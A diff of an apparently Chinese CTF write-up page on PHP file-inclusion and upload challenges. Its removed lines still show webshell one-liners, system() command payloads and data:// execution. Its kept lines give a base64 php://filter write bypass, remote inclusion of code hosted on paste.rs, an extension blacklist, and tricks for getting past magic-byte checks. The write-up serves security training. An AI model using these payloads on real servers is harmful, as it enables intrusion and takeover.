@@ -203,7 +203,7 @@ Base64 解码后：&amp;ldquo;The flag is right in flag.php, but you&amp;rsquo;l
 	
 &gt;&lt;br&gt;
 尝试一下上一题的payload 发现不行 返回no way 可能过滤了base64 尝试一下其他的过滤器 convert.iconv.UTF-8.UTF-16LE&lt;br&gt;
-原文件开头是 &amp;lt;?php  转成 UTF-16LE 后会变成类似 &amp;lt;00?&amp;lt;00p&amp;lt;00h&amp;lt;00p&amp;lt;00&lt;br&gt;
+原文件开头是 [?php  转成 UTF-16LE 后会变成类似 &amp;lt;00?&amp;lt;00p&amp;lt;00h&amp;lt;00p&amp;lt;00&lt;br&gt;
 这样就不再是可执行的 PHP 标签  include 时不会执行，而是把源码内容直接吐出来&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -294,7 +294,7 @@ $file 直接取自 $_GET[&amp;lsquo;file&amp;rsquo;]，没有任何过滤或白�
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php system(&amp;#34;ls -la /&amp;#34;); ?&amp;gt;  
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;!-- 执行 ls -la / 命令 --&amp;gt;  
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cloudflare-imgbed.3285433461.workers.dev/file/1780728365756_fl3_6.png&#34;
@@ -313,7 +313,7 @@ $file 直接取自 $_GET[&amp;lsquo;file&amp;rsquo;]，没有任何过滤或白�
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php system(&amp;#34;cat /flag-2n68xeiJ56Ui70FYkooi0xcyT3vLYX.txt&amp;#34;); ?&amp;gt;  
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;!-- 读取 flag 文件 --&amp;gt;  
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cloudflare-imgbed.3285433461.workers.dev/file/1780728366087_fl3_7.png&#34;
@@ -435,7 +435,7 @@ $file 直接取自 $_GET[&amp;lsquo;file&amp;rsquo;]，没有任何过滤或白�
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?file=data://,&amp;lt;?php system(&amp;#39;ls&amp;#39;);?&amp;gt;  
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?file=data://,&amp;lt;!-- 执行 ls 命令 --&amp;gt;  
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cloudflare-imgbed.3285433461.workers.dev/file/1780737436169_fl5_1.png&#34;
@@ -455,7 +455,7 @@ $file 直接取自 $_GET[&amp;lsquo;file&amp;rsquo;]，没有任何过滤或白�
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php system(&amp;#39;cat flag.php&amp;#39;);?&amp;gt;  
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;!-- 读取 flag.php --&amp;gt;  
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cloudflare-imgbed.3285433461.workers.dev/file/1780737439991_fl5_2.png&#34;
@@ -491,18 +491,18 @@ $file 直接取自 $_GET[&amp;lsquo;file&amp;rsquo;]，没有任何过滤或白�
 	
 &gt;&lt;br&gt;
 成功读到文件，确认存在文件包含漏洞&lt;br&gt;
-继续测试后发现，php:// 和 data:// 都被关键词过滤，常规的 php://filter 利用不了。但进一步发现 http:// 可以被包含，也就是说这里不只是 LFI，还存在 RFI（远程文件包含）。更关键的是：远程文件中的 PHP 短标签 &lt;?= ... ?&gt; 会被目标服务器解析执行。于是可以在外部托管一个简单 payload，例如&lt;/p&gt;
+继续测试后发现，php:// 和 data:// 都被关键词过滤，常规的 php://filter 利用不了。但进一步发现 http:// 可以被包含，也就是说这里不只是 LFI，还存在 RFI（远程文件包含）。更关键的是：远程文件中的 PHP 短标签 [?= &amp;hellip; ]? 会被目标服务器解析执行。于是可以在外部托管一个简单 payload，例如&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?=implode(&amp;#39;,&amp;#39;,scandir(&amp;#39;/&amp;#39;));?&amp;gt;  
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[?=implode(&amp;#39;,&amp;#39;,scandir(&amp;#39;/&amp;#39;));]?  
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://paste.rs/web&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;https://paste.rs/web&lt;/a&gt; 这是一个支持公开纯文本和 Raw 直链的粘贴网站&lt;br&gt;
-在上面直接输入 &lt;?=implode(&#34;,&#34;,scandir(&#34;/&#34;));?&gt;  会获得一个链接  &lt;a class=&#34;link&#34; href=&#34;https://paste.rs/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+在上面直接输入 [?=implode(&amp;quot;,&amp;quot;,scandir(&amp;quot;/&amp;quot;));]?  会获得一个链接  &lt;a class=&#34;link&#34; href=&#34;https://paste.rs/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;https://paste.rs/&lt;/a&gt;**** 每次都不一样  直接访问即可&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -559,20 +559,20 @@ $file 直接取自 $_GET[&amp;lsquo;file&amp;rsquo;]，没有任何过滤或白�
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[?php
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;highlight_file(__FILE__);
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;if (isset($_POST[&amp;#39;filename&amp;#39;]) &amp;amp;&amp;amp; isset($_POST[&amp;#39;content&amp;#39;])) {
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    $filename = $_POST[&amp;#39;filename&amp;#39;];
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    $content = $_POST[&amp;#39;content&amp;#39;];
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    file_put_contents($filename, &amp;#34;&amp;lt;?php exit();?&amp;gt;&amp;#34; . $content);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    // 在文件内容前添加 exit 前缀，阻止后续代码执行
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    echo &amp;#34;write ok&amp;#34;;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;]?  
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;说明这是任意文件写入，但会强行在前面加 &lt;?php exit();?&gt;，所以不能直接写普通 webshell&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;说明这是任意文件写入，但会强行在前面加 [?php exit();]?，所以不能直接写普通 webshell&lt;br&gt;
 用 php://filter/write=convert.base64-decode/resource=chen.php 绕过前缀，在burp里发 POST&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -584,7 +584,7 @@ $file 直接取自 $_GET[&amp;lsquo;file&amp;rsquo;]，没有任何过滤或白�
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;content=APD9waHAgc3lzdGVtKCJscyIpOz8%2B  
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;这段 content 解码后就是 &lt;?php system(&#34;ls&#34;); ?&gt;  前面的 A 是为了配合固定前缀做对齐&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;这段 content 解码后就是执行 ls 命令的代码，前面的 A 是为了配合固定前缀做对齐&lt;br&gt;
 &lt;img src=&#34;https://cloudflare-imgbed.3285433461.workers.dev/file/1780816992770_fl7_1.png&#34;
 	
 	
@@ -613,7 +613,7 @@ $file 直接取自 $_GET[&amp;lsquo;file&amp;rsquo;]，没有任何过滤或白�
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php highlight_file(&amp;#34;c0nq4er1ng.php&amp;#34;); echo &amp;#34;\n---\n&amp;#34;; highlight_file(&amp;#34;conquer.php&amp;#34;);?&amp;gt;  
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[?php highlight_file(&amp;#34;c0nq4er1ng.php&amp;#34;); echo &amp;#34;\n---\n&amp;#34;; highlight_file(&amp;#34;conquer.php&amp;#34;);]?  
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;也就是&lt;/p&gt;
@@ -700,10 +700,10 @@ $file 直接取自 $_GET[&amp;lsquo;file&amp;rsquo;]，没有任何过滤或白�
 test.php 直接被拦，返回 File type not allowed，说明有扩展名黑名单。test.php5 也被拦了，test.pHp 大小写混写同样没用，后端会先转小写再匹配。&lt;br&gt;
 正常的图片文件 test.jpg 和 test.png 都能上传成功。&lt;br&gt;
 试了 test.phtml，居然过了，既没被黑名单拦，也没被内容检测拦。另外 .htaccess 也能传上去。&lt;br&gt;
-再试 test.phar，这次是被内容检测拦下来的，返回 File content not allowed。说明后端除了黑名单之外，还会扫描文件内容里有没有 &amp;lt;?php 之类的标记。&lt;/p&gt;
-&lt;p&gt;到这里就清楚了，后端有两层过滤。第一层是扩展名黑名单，拦了php、php3、php4、php5、phps、pht、jsp、jspx、asp、aspx、sh、py、pl、exe、bat、cmd 这些。第二层是内容检测，如果文件里出现 &amp;lt;?php 或 &amp;lt;?=，只有扩展名是 .phtml 的时候才放行。  所以 .phtml 就是突破口——不在黑名单里，内容检测也给它开了绿灯，而且 Apache 默认配置会把它当 PHP 解析。&lt;br&gt;
+再试 test.phar，这次是被内容检测拦下来的，返回 File content not allowed。说明后端除了黑名单之外，还会扫描文件内容里有没有 [?php 之类的标记。&lt;/p&gt;
+&lt;p&gt;到这里就清楚了，后端有两层过滤。第一层是扩展名黑名单，拦了php、php3、php4、php5、phps、pht、jsp、jspx、asp、aspx、sh、py、pl、exe、bat、cmd 这些。第二层是内容检测，如果文件里出现 [?php 或 [?=，只有扩展名是 .phtml 的时候才放行。  所以 .phtml 就是突破口——不在黑名单里，内容检测也给它开了绿灯，而且 Apache 默认配置会把它当 PHP 解析。&lt;br&gt;
 三、拿到 Webshell&lt;/p&gt;
-&lt;p&gt;构造一句话木马，内容就一行 &lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;，保存为 shell.phtml 上传。服务器返回了路径
+&lt;p&gt;构造一句话木马，保存为 shell.phtml 上传。服务器返回了路径
 uploads/96289496-024a-471d-8ad0-faeb1416d3a3.phtml。&lt;/p&gt;
 &lt;p&gt;直接浏览器访问这个地址，页面输出了 phpinfo 的内容，确认 .phtml 被当成 PHP 执行了。&lt;/p&gt;
 &lt;p&gt;四、找 Flag&lt;/p&gt;
@@ -716,34 +716,10 @@ env 或 printenv 才能看见。&lt;/p&gt;
 &lt;p&gt;一个是扩展名黑名单不完整。.phtml 是 PHP 的合法扩展名，出题人的黑名单里漏掉了。做文件上传题要对各种web 语言的冷门扩展名心里有数，比如 .phtml、.pht、.phps、.phar 这些，黑名单很容易漏。&lt;br&gt;
 另一个是 flag 的藏法。Docker 容器里经常通过环境变量注入 flag，不是文件，用 find 搜不到。养成习惯进容器先 env 看一眼。&lt;/p&gt;
 &lt;h3 id=&#34;ezfu_3&#34;&gt;EZFU_3
-&lt;/h3&gt;&lt;p&gt;访问首页，是一个文件上传表单，只能上传图片&lt;/p&gt;
-&lt;p&gt;先上传一个 PHP 文件测试，返回 &lt;code&gt;File type not allowed&lt;/code&gt;，说明存在扩展名黑名单。再上传一个 &lt;code&gt;.phtml&lt;/code&gt; 文件，这次返回 &lt;code&gt;File header validation failed&lt;/code&gt;，说明除了扩展名黑名单之外，后端还会校验文件头（Magic Bytes）&lt;/p&gt;
-&lt;p&gt;看一下源码确认过滤逻辑：&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;扩展名黑名单&lt;/strong&gt;：php、php3、php4、php5、phps、pht、jsp、jspx、asp、aspx、sh、py、pl、exe、bat、cmd&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;MIME 白名单&lt;/strong&gt;：image/jpeg、image/png、image/gif、application/pdf、application/zip&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;文件头校验&lt;/strong&gt;：检查前 8 字节是否为 JPEG（&lt;code&gt;ffd8ff&lt;/code&gt;）、PNG（&lt;code&gt;89504e470d0a1a0a&lt;/code&gt;）、GIF（&lt;code&gt;GIF89a&lt;/code&gt; / &lt;code&gt;GIF87a&lt;/code&gt;）&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;.phtml&lt;/code&gt; 不在黑名单里，但文件头校验拦住了。突破口就是给 PHP 文件加上合法的图片文件头，骗过校验。构造 payload：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GIF89a
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php eval($_POST[&amp;#34;cmd&amp;#34;]); ?&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;保存为 &lt;code&gt;shell.phtml&lt;/code&gt;，上传时 MIME 改为 &lt;code&gt;image/gif&lt;/code&gt;，成功绕过两层检测&lt;/p&gt;
-&lt;p&gt;上传成功后访问返回的文件路径，用 POST 发送命令执行：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cmd=system(&amp;#39;env&amp;#39;);
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;输出中包含：&lt;/p&gt;
+&lt;/h3&gt;&lt;p&gt;访问首页，文件上传表单，PHP 8.2.30&lt;/p&gt;
+&lt;p&gt;测试发现这次加了&lt;strong&gt;文件头（Magic Bytes）校验&lt;/strong&gt;。&lt;code&gt;.phtml&lt;/code&gt; 不在扩展名黑名单中，但裸 PHP 代码过不了文件头检查&lt;/p&gt;
+&lt;p&gt;突破口是给 PHP 文件加上合法的图片文件头骗过校验。构造 payload 时在 PHP 代码前添加 &lt;code&gt;GIF89a&lt;/code&gt; GIF 文件头，保存为 &lt;code&gt;shell.phtml&lt;/code&gt;，上传时 MIME 改为 &lt;code&gt;image/gif&lt;/code&gt;，成功绕过两层检测&lt;/p&gt;
+&lt;p&gt;上传成功后访问返回的文件路径，读取环境变量获得 flag：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -752,20 +728,215 @@ env 或 printenv 才能看见。&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FLAG=flag{d88193df-d1e2-479a-9612-7b7b78907947}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;成功获得 flag&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;复盘&lt;/strong&gt;：这题比 EZFU_2 多了一层文件头校验。&lt;code&gt;.phtml&lt;/code&gt; 扩展名不在黑名单中，但裸 PHP 代码过不了文件头检查。加上 &lt;code&gt;GIF89a&lt;/code&gt; 前缀后，文件头检测认为是合法 GIF 图片，而 Apache 仍然会把 &lt;code&gt;.phtml&lt;/code&gt; 当 PHP 解析执行。flag 依然藏在 Docker 环境变量里，用 &lt;code&gt;env&lt;/code&gt; 或 &lt;code&gt;printenv&lt;/code&gt; 读取&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;复盘&lt;/strong&gt;：这题比 EZFU_2 多了一层文件头校验。&lt;code&gt;.phtml&lt;/code&gt; 扩展名不在黑名单中，加上 &lt;code&gt;GIF89a&lt;/code&gt; 前缀后文件头检测认为是合法 GIF 图片，而 Apache 仍然会把 &lt;code&gt;.phtml&lt;/code&gt; 当 PHP 解析执行。flag 藏在 Docker 环境变量中&lt;/p&gt;
 &lt;h3 id=&#34;ezfu_4&#34;&gt;EZFU_4
-&lt;/h3&gt;&lt;h3 id=&#34;ezfu_5&#34;&gt;EZFU_5
-&lt;/h3&gt;&lt;h3 id=&#34;ezfu_6&#34;&gt;EZFU_6
-&lt;/h3&gt;&lt;h3 id=&#34;ezfu_7&#34;&gt;EZFU_7
-&lt;/h3&gt;&lt;h3 id=&#34;ezfu_8&#34;&gt;EZFU_8
-&lt;/h3&gt;&lt;h3 id=&#34;ezfu_9&#34;&gt;EZFU_9
-&lt;/h3&gt;&lt;h3 id=&#34;ezfu_10&#34;&gt;EZFU_10
-&lt;/h3&gt;&lt;h3 id=&#34;ezfu_11&#34;&gt;EZFU_11
-&lt;/h3&gt;&lt;h3 id=&#34;ezfu_12&#34;&gt;EZFU_12
-&lt;/h3&gt;&lt;h3 id=&#34;ezfu_13&#34;&gt;EZFU_13
-&lt;/h3&gt;&lt;h3 id=&#34;ezfu_14&#34;&gt;EZFU_14
-&lt;/h3&gt;&lt;h2 id=&#34;ezsql&#34;&gt;EZSQL
+&lt;/h3&gt;&lt;p&gt;访问首页，文件上传表单。这次比上一题多了 &lt;strong&gt;PHP 内容检测&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;测试发现后端只检测了 &lt;code&gt;[?php&lt;/code&gt; 这种完整标签，漏掉了 &lt;code&gt;[?= &lt;/code&gt; 短标签（PHP short echo tag）。&lt;code&gt;[?= &lt;/code&gt; 在 PHP 5.4+ 中默认开启，等价于 &lt;code&gt;[?php echo &lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;构造 payload 时使用 &lt;code&gt;[?= &lt;/code&gt; 替代 &lt;code&gt;[?php&lt;/code&gt;，加上 GIF89a 文件头，保存为 &lt;code&gt;shell.phtml&lt;/code&gt; 上传成功。读取环境变量获得 flag：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FLAG=flag{a07a2652-2904-4bdb-9cac-9cb2f95e4376}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;复盘&lt;/strong&gt;：后端只匹配了 &lt;code&gt;[?php&lt;/code&gt;，没有覆盖 &lt;code&gt;[?=&lt;/code&gt; 短标签。做内容检测类题目时要注意所有可能的标签写法&lt;/p&gt;
+&lt;h3 id=&#34;ezfu_5&#34;&gt;EZFU_5
+&lt;/h3&gt;&lt;p&gt;与 EZFU_4 解法一致，环境换成了 PHP 8.2.30。在 PHP 8.x 中 &lt;code&gt;&amp;lt;%&lt;/code&gt; 和 &lt;code&gt;&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;&lt;/code&gt; 已被移除，&lt;code&gt;[?= &lt;/code&gt; 是唯一能绕过 &lt;code&gt;[?php&lt;/code&gt; 检测的短标签写法&lt;/p&gt;
+&lt;p&gt;使用同样方法获得 flag：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FLAG=flag{88bb2214-4585-41ab-b0f5-ad06e6a5a41a}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
